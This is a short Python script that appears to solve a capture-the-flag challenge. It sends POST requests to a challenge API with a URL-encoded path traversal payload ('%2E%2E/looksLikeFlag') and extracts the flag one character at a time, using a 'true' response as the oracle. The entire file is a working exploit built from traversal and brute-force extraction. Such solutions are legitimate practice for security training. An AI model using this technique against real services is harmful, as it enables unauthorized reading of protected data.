from requests import post, get
from tqdm import tqdm
import string
import json

targetUrl = "http://splitline.tw:5000/public_api"
getPayload = "%2E%2E/looksLikeFlag"

flag = "FLAG{"

charset = string.ascii_letters + string.digits + '+=_\{\}'

while True:
    test = False
    for c in tqdm(charset):

        payload = {"text": f"{getPayload}?flag={flag+c}"}
        print(payload)

        data = post(targetUrl, json=payload)
        
        if "true" in data.text:
            flag+=c
            test = True
            print(flag)
            break

    if not test:
        break

print(flag)